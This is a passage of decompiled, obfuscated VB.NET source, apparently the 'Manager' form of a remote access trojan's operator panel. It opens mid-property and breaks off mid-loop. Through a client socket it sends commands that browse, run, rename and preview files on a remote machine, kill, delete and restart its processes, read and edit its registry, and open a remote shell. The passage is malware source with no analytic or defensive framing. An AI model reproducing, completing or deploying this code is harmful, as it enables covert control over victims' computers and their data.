				Return Me._ColumnHeader25
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader25 = value
			End Set
		End Property

		' Token: 0x1700016E RID: 366
		' (get) Token: 0x060003B6 RID: 950 RVA: 0x00166158 File Offset: 0x00164558
		' (set) Token: 0x060003B7 RID: 951 RVA: 0x00166170 File Offset: 0x00164570
		Friend Overridable Property ColumnHeader26 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader26
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader26 = value
			End Set
		End Property

		' Token: 0x1700016F RID: 367
		' (get) Token: 0x060003B8 RID: 952 RVA: 0x0016617C File Offset: 0x0016457C
		' (set) Token: 0x060003B9 RID: 953 RVA: 0x00166194 File Offset: 0x00164594
		Friend Overridable Property LSRV As GClass9
			<DebuggerNonUserCode()>
			Get
				Return Me._LSRV
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As GClass9)
				Me._LSRV = value
			End Set
		End Property

		' Token: 0x17000170 RID: 368
		' (get) Token: 0x060003BA RID: 954 RVA: 0x001661A0 File Offset: 0x001645A0
		' (set) Token: 0x060003BB RID: 955 RVA: 0x001661B8 File Offset: 0x001645B8
		Friend Overridable Property ColumnHeader11 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader11
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader11 = value
			End Set
		End Property

		' Token: 0x17000171 RID: 369
		' (get) Token: 0x060003BC RID: 956 RVA: 0x001661C4 File Offset: 0x001645C4
		' (set) Token: 0x060003BD RID: 957 RVA: 0x001661DC File Offset: 0x001645DC
		Friend Overridable Property ColumnHeader12 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader12
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader12 = value
			End Set
		End Property

		' Token: 0x17000172 RID: 370
		' (get) Token: 0x060003BE RID: 958 RVA: 0x001661E8 File Offset: 0x001645E8
		' (set) Token: 0x060003BF RID: 959 RVA: 0x00166200 File Offset: 0x00164600
		Friend Overridable Property ColumnHeader13 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader13
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader13 = value
			End Set
		End Property

		' Token: 0x17000173 RID: 371
		' (get) Token: 0x060003C0 RID: 960 RVA: 0x0016620C File Offset: 0x0016460C
		' (set) Token: 0x060003C1 RID: 961 RVA: 0x00166224 File Offset: 0x00164624
		Friend Overridable Property ColumnHeader14 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader14
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader14 = value
			End Set
		End Property

		' Token: 0x17000174 RID: 372
		' (get) Token: 0x060003C2 RID: 962 RVA: 0x00166230 File Offset: 0x00164630
		' (set) Token: 0x060003C3 RID: 963 RVA: 0x00166248 File Offset: 0x00164648
		Friend Overridable Property ColumnHeader15 As ColumnHeader
			<DebuggerNonUserCode()>
			Get
				Return Me._ColumnHeader15
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ColumnHeader)
				Me._ColumnHeader15 = value
			End Set
		End Property

		' Token: 0x17000175 RID: 373
		' (get) Token: 0x060003C4 RID: 964 RVA: 0x00166254 File Offset: 0x00164654
		' (set) Token: 0x060003C5 RID: 965 RVA: 0x0016626C File Offset: 0x0016466C
		Friend Overridable Property vmethod_108 As ImageList
			<DebuggerNonUserCode()>
			Get
				Return Me._vmethod_108
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ImageList)
				Me._vmethod_108 = value
			End Set
		End Property

		' Token: 0x17000176 RID: 374
		' (get) Token: 0x060003C6 RID: 966 RVA: 0x00166278 File Offset: 0x00164678
		' (set) Token: 0x060003C7 RID: 967 RVA: 0x00166290 File Offset: 0x00164690
		Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
			<DebuggerNonUserCode()>
			Get
				Return Me._ToolStripMenuItem1
			End Get
			<DebuggerNonUserCode()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem1_Click
				Dim flag As Boolean = Me._ToolStripMenuItem1 IsNot Nothing
				If flag Then
					RemoveHandler Me._ToolStripMenuItem1.Click, value2
				End If
				Me._ToolStripMenuItem1 = value
				flag = (Me._ToolStripMenuItem1 IsNot Nothing)
				If flag Then
					AddHandler Me._ToolStripMenuItem1.Click, value2
				End If
			End Set
		End Property

		' Token: 0x060003C8 RID: 968 RVA: 0x001662F0 File Offset: 0x001646F0
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.Manager_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Manager_Load
			AddHandler MyBase.Resize, AddressOf Me.Manager_Resize
			Manager.__ENCAddToList(Me)
			Me.RGCH = New Collection()
			Me.string_0 = String.Empty
			Me.Images = New Collection()
			Me.Cache = New Collection()
			Me.isCut = False
			Me.Flist = String.Empty
			Me.TCPFX = True
			Me.PRFX = True
			Me.SrvFX = True
			Me.srvNxt = True
			Me.PID = 0
			Me.PRNXT = True
			Me.TCPNXT = True
			Me.string_1 = New String(4) {}
			Me.int_0 = 0
			Me.int_1 = 0
			Me.cur = Manager.CR.fm
			Me.shStarted = 0
			Me.InitializeComponent()
		End Sub

		' Token: 0x060003C9 RID: 969 RVA: 0x001663E8 File Offset: 0x001647E8
		Public Sub exp(x As String, Optional Refresh As Boolean = False)
			Try
				Dim text As String = x.Replace("\\", "\")
				Dim flag As Boolean = Not text.EndsWith("\")
				If flag Then
					text += "\"
				End If
				Me.TextBox1.Text = text
				Dim pr As ToolStripProgressBar = Me.pr
				Dim obj As ToolStripProgressBar = pr
				SyncLock obj
					Me.p.Image = Nothing
					Me.p.Visible = False
					Me.TextBox1.BackColor = Color.IndianRed
					flag = (Refresh AndAlso Me.Cache.Contains(text))
					If flag Then
						Me.Cache.Remove(text)
					End If
					flag = Me.Cache.Contains(text)
					If flag Then
						Me.TextBox1.BackColor = Color.Pink
						Dim gclass As Manager.GClass14 = CType(Me.Cache(text), Manager.GClass14)
						Me.pr.Value = 0
						Me.pr.Maximum = gclass.list_1.Count + gclass.list_0.Count
						Me.L2.Items.Clear()
						flag = (New DirectoryInfo(text).Parent IsNot Nothing)
						If flag Then
							Dim listViewItem As ListViewItem = Me.L2.Items.Add("..", "..", 0)
							listViewItem.SubItems.Add(String.Empty)
							listViewItem.SubItems.Add("DIR")
							listViewItem.ToolTipText = New DirectoryInfo(text).Parent.FullName + "\"
						End If
						Try
							For Each text2 As String In gclass.list_0
								Dim pr2 As ToolStripProgressBar = Me.pr
								Dim toolStripProgressBar As ToolStripProgressBar = pr2
								toolStripProgressBar.Value += 1
								Dim listViewItem2 As ListViewItem = Me.L2.Items.Add(text2, New DirectoryInfo(text2).Name, 0)
								listViewItem2.SubItems.Add(String.Empty)
								listViewItem2.SubItems.Add("DIR")
								listViewItem2.ToolTipText = text2
							Next
						Finally
							Dim enumerator As List(Of String).Enumerator
							CType(enumerator, IDisposable).Dispose()
						End Try
						Dim list As List(Of ListViewItem) = New List(Of ListViewItem)()
						Dim flag2 As Boolean
						Try
							For Each expression As String In gclass.list_1
								Dim pr2 As ToolStripProgressBar = Me.pr
								Dim toolStripProgressBar As ToolStripProgressBar = pr2
								toolStripProgressBar.Value += 1
								Dim array As String() = Strings.Split(expression, "*", -1, CompareMethod.Binary)
								Dim fileInfo As FileInfo = New FileInfo(array(0))
								Dim listViewItem3 As ListViewItem = New ListViewItem(fileInfo.Name, 1)
								Dim listViewItem4 As ListViewItem = listViewItem3
								listViewItem4.ToolTipText = fileInfo.FullName
								listViewItem4.SubItems.Add(array(1))
								listViewItem4.SubItems.Add(array(2))
								listViewItem4.Name = listViewItem4.ToolTipText
								flag = Me.Images.Contains("!" + listViewItem4.ToolTipText)
								If flag Then
									Try
										flag2 = Not Me.vmethod_108.Images.ContainsKey(listViewItem4.ToolTipText)
										If flag2 Then
											Dim array2 As Object() = New Object(1) {}
											Dim listViewItem5 As ListViewItem = listViewItem4
											array2(0) = listViewItem5.ToolTipText
											array2(1) = RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(Me.Images(listViewItem4.ToolTipText))))
											Dim array3 As Object() = array2
											Dim array4 As Boolean() = New Boolean() { True, False }
											NewLateBinding.LateCall(Me.vmethod_108.Images, Nothing, "Add", array3, Nothing, Nothing, array4, True)
											flag2 = array4(0)
											If flag2 Then
												listViewItem5.ToolTipText = Conversions.ToString(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(array3(0)))), GetType(String)))
											End If
										End If
									Catch ex As Exception
									End Try
									listViewItem4.ImageKey = listViewItem4.ToolTipText
								Else
									flag2 = (fileInfo.Extension.Length > 0)
									If flag2 Then
										flag = Not Me.vmethod_108.Images.ContainsKey(fileInfo.Extension)
										If flag Then
											File.Create(Application.StartupPath + "\!" + fileInfo.Extension).Close()
											Me.vmethod_108.Images.Add(fileInfo.Extension, Icon.ExtractAssociatedIcon(Application.StartupPath + "\!" + fileInfo.Extension))
											File.Delete(Application.StartupPath + "\!" + fileInfo.Extension)
											listViewItem4.ImageKey = fileInfo.Extension
										Else
											listViewItem4.ImageKey = fileInfo.Extension
										End If
									End If
								End If
								listViewItem4 = Nothing
								list.Add(listViewItem3)
								flag2 = (list.Count > 20)
								If flag2 Then
									Me.L2.Items.AddRange(list.ToArray())
									list.Clear()
								End If
							Next
						Finally
							Dim enumerator2 As List(Of String).Enumerator
							CType(enumerator2, IDisposable).Dispose()
						End Try
						flag2 = (list.Count > 0)
						If flag2 Then
							Me.L2.Items.AddRange(list.ToArray())
							list.Clear()
						End If
						Me.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.HeaderSize)
						Me.pr.Value = 0
					Else
						Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "!", Class7.string_1, Class6.smethod_14(text) }))
					End If
				End SyncLock
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x060003CA RID: 970 RVA: 0x00166A9C File Offset: 0x00164E9C
		Private Sub Manager_FormClosing(sender As Object, e As FormClosingEventArgs)
			Try
				Me.Images.Clear()
			Catch ex As Exception
			End Try
			Try
				Me.Cache.Clear()
			Catch ex2 As Exception
			End Try
			Dim flag As Boolean = Me.sk IsNot Nothing AndAlso Me.sk.CN
			If flag Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "rs", Class7.string_1, "@" }))
			End If
		End Sub

		' Token: 0x060003CB RID: 971 RVA: 0x00166B6C File Offset: 0x00164F6C
		Private Sub Manager_Load(sender As Object, e As EventArgs)
			Try
				Me.LPR.Tag = Nothing
				Me.LTCP.Tag = Nothing
				Me.RGk.Nodes.Add("HKEY_CLASSES_ROOT", "HKEY_CLASSES_ROOT")
				Me.RGk.Nodes.Add("HKEY_CURRENT_USER", "HKEY_CURRENT_USER")
				Me.RGk.Nodes.Add("HKEY_LOCAL_MACHINE", "HKEY_LOCAL_MACHINE")
				Me.RGk.Nodes.Add("HKEY_USERS", "HKEY_USERS")
				Me.L2.Controls.Add(Me.p)
				Me.ListView1.Items(0).Selected = True
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "~" }))
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "~" }))
				Me.Text = Conversions.ToString(RuntimeHelpers.GetObjectValue(Class7.smethod_1(Me.sk.L)))
				Me.L2.Controls.Add(Me.p)
				Me.p.Visible = False
				Try
					Me.string_0 = Me.sk.Folder + "Downloads\"
				Catch ex As Exception
				End Try
				Me.vmethod_26.Enabled = True
			Catch ex2 As Exception
			End Try
		End Sub

		' Token: 0x060003CC RID: 972 RVA: 0x00166D84 File Offset: 0x00165184
		Private Sub Manager_Resize(sender As Object, e As EventArgs)
			Me.p.Left = Me.L2.Width - Me.p.Width - 25
			Me.p.Top = Me.L2.Height - Me.p.Height - 25
		End Sub

		' Token: 0x060003CD RID: 973 RVA: 0x00166DE0 File Offset: 0x001651E0
		Private Sub KillToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Dim flag As Boolean
			Try
				For Each obj As Object In Me.LPR.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					text = text + Class7.string_1 + listViewItem.SubItems(1).Text
				Next
			Finally
				Dim enumerator As IEnumerator
				flag = (TypeOf enumerator Is IDisposable)
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			flag = (text.Length > 0)
			If flag Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "k", text }))
			End If
		End Sub

		' Token: 0x060003CE RID: 974 RVA: 0x00166ECC File Offset: 0x001652CC
		Private Sub KillDeleteToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Dim flag As Boolean
			Try
				For Each obj As Object In Me.LPR.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					text = String.Concat(New String() { text, Class7.string_1, listViewItem.SubItems(1).Text, "::", listViewItem.ToolTipText })
				Next
			Finally
				Dim enumerator As IEnumerator
				flag = (TypeOf enumerator Is IDisposable)
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			flag = (text.Length > 0)
			If flag Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "kd", text }))
			End If
		End Sub

		' Token: 0x060003CF RID: 975 RVA: 0x00166FE0 File Offset: 0x001653E0
		Private Sub RefreshToolStripMenuItem2_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.TextBox1.Text.Length > 0
			If flag Then
				Me.exp(Me.TextBox1.Text, True)
			End If
		End Sub

		' Token: 0x060003D0 RID: 976 RVA: 0x0016701C File Offset: 0x0016541C
		Private Sub EditToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Me.RGLIST_DoubleClick(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(RuntimeHelpers.GetObjectValue(sender))), e)
		End Sub

		' Token: 0x060003D1 RID: 977 RVA: 0x00167038 File Offset: 0x00165438
		Private Sub RGLIST_DoubleClick(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.RGLIST.SelectedItems.Count <> 0
			If flag Then
				Dim listViewItem As ListViewItem = Me.RGLIST.SelectedItems(0)
				Dim rgv As RGv = New RGv() With { .Path = Me.RGk.SelectedNode.FullPath + "\", .sk = Me.sk }
				rgv.TextBox1.Text = listViewItem.Text
				rgv.ComboBox1.SelectedIndex = rgv.ComboBox1.Items.IndexOf(listViewItem.SubItems(1).Text)
				Try
					rgv.TextBox3.Text = listViewItem.SubItems(2).Text
				Catch ex As Exception
				End Try
				rgv.Text = rgv.Path
				rgv.TextBox1.[ReadOnly] = True
				rgv.ShowDialog(Me)
			End If
		End Sub

		' Token: 0x060003D2 RID: 978 RVA: 0x00167150 File Offset: 0x00165550
		Private Sub NewValueToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim rgv As RGv = New RGv() With { .Path = Me.RGk.SelectedNode.FullPath + "\", .sk = Me.sk }
			rgv.TextBox1.Text = "Name"
			rgv.ComboBox1.SelectedIndex = rgv.ComboBox1.Items.IndexOf("String")
			rgv.TextBox3.Text = "Value"
			rgv.Text = rgv.Path
			rgv.ShowDialog(Me)
		End Sub

		' Token: 0x060003D3 RID: 979 RVA: 0x001671EC File Offset: 0x001655EC
		Private Sub T2_KeyDown(sender As Object, e As KeyEventArgs)
			Dim keyCode As Keys = e.KeyCode
			Dim flag As Boolean = keyCode = Keys.[Return]
			If flag Then
				Dim text As String = Me.T2.Text
				Me.T2.Text = String.Empty
				e.SuppressKeyPress = True
				Me.string_1(Me.int_1) = text
				Me.int_1 += 1
				flag = (Me.int_1 > Me.string_1.Length - 1)
				If flag Then
					Me.int_1 = 0
				End If
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "rs", Class7.string_1, "!", Class7.string_1, Class6.smethod_14(text) }))
			Else
				flag = (keyCode = Keys.Down)
				If flag Then
					Me.int_0 += -1
					flag = (Me.int_0 < 0)
					If flag Then
						Me.int_0 = 0
					End If
					Me.T2.Text = Me.string_1(Me.int_0)
				Else
					flag = (keyCode = Keys.Up)
					If flag Then
						Me.int_0 += 1
						flag = (Me.int_0 > Me.string_1.Length - 1)
						If flag Then
							Me.int_0 = Me.string_1.Length - 1
						End If
						Me.T2.Text = Me.string_1(Me.int_0)
					End If
				End If
			End If
		End Sub

		' Token: 0x060003D4 RID: 980 RVA: 0x0016737C File Offset: 0x0016577C
		Private Sub sh_Resize(sender As Object, e As EventArgs)
			Me.T1.ScrollToCaret()
		End Sub

		' Token: 0x060003D5 RID: 981 RVA: 0x0016738C File Offset: 0x0016578C
		Private Sub RGk_AfterCollapse(sender As Object, e As TreeViewEventArgs)
			Dim flag As Boolean = Me.RGCH.Contains(e.Node.FullPath + "\")
			Dim gclass As Manager.GClass13
			If flag Then
				gclass = CType(Me.RGCH(e.Node.FullPath + "\"), Manager.GClass13)
			End If
			flag = (gclass Is Nothing)
			If flag Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
			Else
				flag = (gclass.list_0.Count = 0 And gclass.list_1.Count = 0)
				If flag Then
					Me.RGLIST.Items.Clear()
					Me.RGk.Enabled = False
					Me.RGLIST.Enabled = False
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
				Else
					Me.RGLIST.Items.Clear()
					Try
						For Each array As String() In gclass.list_0
							Dim listViewItem As ListViewItem = Me.RGLIST.Items.Add(array(0))
							listViewItem.SubItems.Add(array(1))
							listViewItem.SubItems.Add(array(2))
							flag = (Operators.CompareString(array(1), "String", False) = 0)
							If flag Then
								listViewItem.ImageIndex = 1
							Else
								listViewItem.ImageIndex = 2
							End If
						Next
					Finally
						Dim enumerator As List(Of String()).Enumerator
						CType(enumerator, IDisposable).Dispose()
					End Try
					Me.RGLIST.method_3()
				End If
			End If
		End Sub

		' Token: 0x060003D6 RID: 982 RVA: 0x001675E4 File Offset: 0x001659E4
		Private Sub RGk_AfterExpand(sender As Object, e As TreeViewEventArgs)
			Dim flag As Boolean = Me.RGCH.Contains(e.Node.FullPath + "\")
			Dim gclass As Manager.GClass13
			If flag Then
				gclass = CType(Me.RGCH(e.Node.FullPath + "\"), Manager.GClass13)
			End If
			flag = (gclass Is Nothing)
			If flag Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
			Else
				flag = (gclass.list_0.Count = 0 And gclass.list_1.Count = 0)
				If flag Then
					Me.RGLIST.Items.Clear()
					Me.RGk.Enabled = False
					Me.RGLIST.Enabled = False
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
				Else
					Me.RGLIST.Items.Clear()
					Try
						For Each array As String() In gclass.list_0
							Dim listViewItem As ListViewItem = Me.RGLIST.Items.Add(array(0))
							listViewItem.SubItems.Add(array(1))
							listViewItem.SubItems.Add(array(2))
							flag = (Operators.CompareString(array(1), "String", False) = 0)
							If flag Then
								listViewItem.ImageIndex = 1
							Else
								listViewItem.ImageIndex = 2
							End If
						Next
					Finally
						Dim enumerator As List(Of String()).Enumerator
						CType(enumerator, IDisposable).Dispose()
					End Try
					Me.RGLIST.method_3()
				End If
			End If
		End Sub

		' Token: 0x060003D7 RID: 983 RVA: 0x0016783C File Offset: 0x00165C3C
		Private Sub RGk_AfterSelect(sender As Object, e As TreeViewEventArgs)
			Dim flag As Boolean = Me.RGCH.Contains(e.Node.FullPath + "\")
			Dim gclass As Manager.GClass13
			If flag Then
				gclass = CType(Me.RGCH(e.Node.FullPath + "\"), Manager.GClass13)
			End If
			flag = (gclass Is Nothing)
			If flag Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
			Else
				flag = (gclass.list_0.Count = 0 And gclass.list_1.Count = 0)
				If flag Then
					Me.RGLIST.Items.Clear()
					Me.RGk.Enabled = False
					Me.RGLIST.Enabled = False
					Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, e.Node.FullPath, "\" }))
				Else
					Me.RGLIST.Items.Clear()
					Try
						For Each array As String() In gclass.list_0
							Dim listViewItem As ListViewItem = Me.RGLIST.Items.Add(array(0))
							listViewItem.SubItems.Add(array(1))
							listViewItem.SubItems.Add(array(2))
							flag = (Operators.CompareString(array(1), "String", False) = 0)
							If flag Then
								listViewItem.ImageIndex = 1
							Else
								listViewItem.ImageIndex = 2
							End If
						Next
					Finally
						Dim enumerator As List(Of String()).Enumerator
						CType(enumerator, IDisposable).Dispose()
					End Try
					Me.RGLIST.method_3()
					flag = Not e.Node.IsExpanded
					If flag Then
						e.Node.Expand()
					End If
				End If
			End If
		End Sub

		' Token: 0x060003D8 RID: 984 RVA: 0x00167AB4 File Offset: 0x00165EB4
		Private Sub RestartProcessToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Dim flag As Boolean
			Try
				For Each obj As Object In Me.LPR.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					text = String.Concat(New String() { text, Class7.string_1, listViewItem.SubItems(1).Text, "::", listViewItem.ToolTipText, "::", listViewItem.SubItems(4).Text })
				Next
			Finally
				Dim enumerator As IEnumerator
				flag = (TypeOf enumerator Is IDisposable)
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			flag = (text.Length > 0)
			If flag Then
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "proc", Class7.string_1, "re", text }))
			End If
		End Sub

		' Token: 0x060003D9 RID: 985 RVA: 0x00167BE4 File Offset: 0x00165FE4
		Private Sub RefreshToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.RGk.SelectedNode IsNot Nothing
			If flag Then
				Me.RGk.Enabled = False
				Me.RGLIST.Enabled = False
				Me.sk.Send(String.Concat(New String() { "Ex", Class7.string_1, "RG", Class7.string_1, "~", Class7.string_1, Me.RGk.SelectedNode.FullPath, "\" }))
			End If
		End Sub

		' Token: 0x060003DA RID: 986 RVA: 0x00167C94 File Offset: 0x00166094
		Private Sub L2_DoubleClick(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L2.SelectedItems.Count <> 0
			If flag Then
				Dim flag2 As Boolean = Operators.CompareString(Me.L2.SelectedItems(0).SubItems(2).Text, "DIR", False) = 0
				If flag2 Then
					Me.exp(Me.L2.SelectedItems(0).ToolTipText, False)
				Else
					Dim array As String() = New String(6) {}
					array(0) = "Ex"
					array(1) = Class7.string_1
					array(2) = "fm"
					array(3) = Class7.string_1
					array(4) = "rd"
					array(5) = Class7.string_1
					Dim listViewItem As ListViewItem = Me.L2.SelectedItems(0)
					Dim toolTipText As String = listViewItem.ToolTipText
					listViewItem.ToolTipText = toolTipText
					array(6) = Class6.smethod_14(toolTipText)
					Me.sk.Send(String.Concat(array))
				End If
			End If
		End Sub

		' Token: 0x060003DB RID: 987 RVA: 0x00167D94 File Offset: 0x00166194
		Private Sub L2_SelectedIndexChanged(sender As Object, e As EventArgs)
			Me.p.Image = Nothing
			Me.p.Visible = False
			Dim flag As Boolean = Me.L2.SelectedItems.Count = 1
			If flag Then
				Dim listViewItem As ListViewItem = Me.L2.SelectedItems(0)
				flag = Me.Images.Contains(listViewItem.ToolTipText)
				If flag Then
					Me.p.Image = CType(Me.Images(listViewItem.ToolTipText), Image)
					Me.p.Visible = True
				Else
					flag = (listViewItem.SubItems(2).Text.Length > 0 AndAlso ".jpg.jpeg.png.ico.bmp.tiff.gif".Contains(listViewItem.SubItems(2).Text.ToLower()))
					If flag Then
						Dim array As String() = New String(10) {}
						array(0) = "Ex"
						array(1) = Class7.string_1
						array(2) = "fm"
						array(3) = Class7.string_1
						array(4) = "#"
						array(5) = Class7.string_1
						Dim listViewItem2 As ListViewItem = listViewItem
						Dim toolTipText As String = listViewItem2.ToolTipText
						listViewItem2.ToolTipText = toolTipText
						array(6) = Class6.smethod_14(toolTipText)
						array(7) = Class7.string_1
						array(8) = Conversions.ToString(Me.p.Width)
						array(9) = Class7.string_1
						array(10) = Conversions.ToString(Me.p.Height)
						Me.sk.Send(String.Concat(array))
					End If
				End If
			End If
		End Sub

		' Token: 0x060003DC RID: 988 RVA: 0x00167F28 File Offset: 0x00166328
		Private Sub UPToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L2.Items.ContainsKey("..")
			If flag Then
				Me.exp(Me.L2.Items("..").ToolTipText, False)
			End If
		End Sub

		' Token: 0x060003DD RID: 989 RVA: 0x00167F74 File Offset: 0x00166374
		Private Sub RunToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L2.SelectedItems.Count > 0
			If flag Then
				Dim text As String = String.Concat(New String() { "Ex", Class7.string_1, "fm", Class7.string_1, "rn" })
				Try
					For Each obj As Object In Me.L2.SelectedItems
						Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
						Dim toolTipText As String = listViewItem.ToolTipText
						listViewItem.ToolTipText = toolTipText
						text = text + Class7.string_1 + Class6.smethod_14(toolTipText)
					Next
				Finally
					Dim enumerator As IEnumerator
					flag = (TypeOf enumerator Is IDisposable)
					If flag Then
						TryCast(enumerator, IDisposable).Dispose()
					End If
				End Try
				Me.sk.Send(text)
			End If
		End Sub

		' Token: 0x060003DE RID: 990 RVA: 0x00168070 File Offset: 0x00166470
		Private Sub RenameToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Try
				For Each obj As Object In Me.L2.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					Dim flag As Boolean = Operators.CompareString(listViewItem.Text, "..", False) <> 0
					If flag Then
						Dim flag2 As Boolean = Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) = 0
						If flag2 Then
							Dim text As String = Interaction.InputBox(String.Empty, "Rename", listViewItem.Text, -1, -1)
							flag2 = (text.Length > 0)
							If flag2 Then
								Dim client As Client = Me.sk
								Dim array As String() = New String(6) {}
								array(0) = "Ex"
								array(1) = Class7.string_1
								array(2) = "fm"
								array(3) = Class7.string_1
								array(4) = "nm"
								array(5) = Class7.string_1
								Dim array2 As String() = array
								Dim num As Integer = 6
								Dim text2 As String = listViewItem.ToolTipText + "*" + text + "*!"
								array2(num) = Class6.smethod_14(text2)
								client.Send(String.Concat(array))
							End If
						Else
							Dim text3 As String = Interaction.InputBox(String.Empty, "Rename", listViewItem.Text, -1, -1)
							flag2 = (text3.Length > 0)
							If flag2 Then
								Dim client2 As Client = Me.sk
								Dim array As String() = New String(6) {}
								array(0) = "Ex"
								array(1) = Class7.string_1
								array(2) = "fm"
								array(3) = Class7.string_1
								array(4) = "nm"
								array(5) = Class7.string_1
								Dim array3 As String() = array
								Dim num2 As Integer = 6
								Dim text2 As String = listViewItem.ToolTipText + "*" + text3 + "*"
								array3(num2) = Class6.smethod_14(text2)
								client2.Send(String.Concat(array))
							End If
						End If
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				Dim flag2 As Boolean = TypeOf enumerator Is IDisposable
				If flag2 Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
		End Sub

		' Token: 0x060003DF RID: 991 RVA: 0x00168288 File Offset: 0x00166688
		Private Sub SL_Click(sender As Object, e As EventArgs)
			Me.SL.Text = String.Empty
		End Sub

		' Token: 0x060003E0 RID: 992 RVA: 0x001682A0 File Offset: 0x001666A0
		Private Sub CopyToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Dim flag As Boolean
			Try
				For Each obj As Object In Me.L2.SelectedItems
					Dim listViewItem As ListViewItem = CType(obj, ListViewItem)
					flag = (Operators.CompareString(listViewItem.Text, "..", False) <> 0 AndAlso Operators.CompareString(listViewItem.SubItems(2).Text, "DIR", False) <> 0)
					If flag Then
						text = text + "*" + listViewItem.ToolTipText
					End If
				Next
			Finally
				Dim enumerator As IEnumerator
				flag = (TypeOf enumerator Is IDisposable)
				If flag Then
					TryCast(enumerator, IDisposable).Dispose()
				End If
			End Try
			flag = (Operators.CompareString(text, String.Empty, False) <> 0)
			If flag Then
				Me.Flist = text.Remove(0, 1)
				Me.isCut = False
			End If
		End Sub

		' Token: 0x060003E1 RID: 993 RVA: 0x0016838C File Offset: 0x0016678C
		Private Sub CutToolStripMenuItem_Click(sender As Object, e As EventArgs)
			Dim text As String = String.Empty
			Dim flag As Boolean
			Try
				For Each obj As Object In Me.L2.SelectedItems
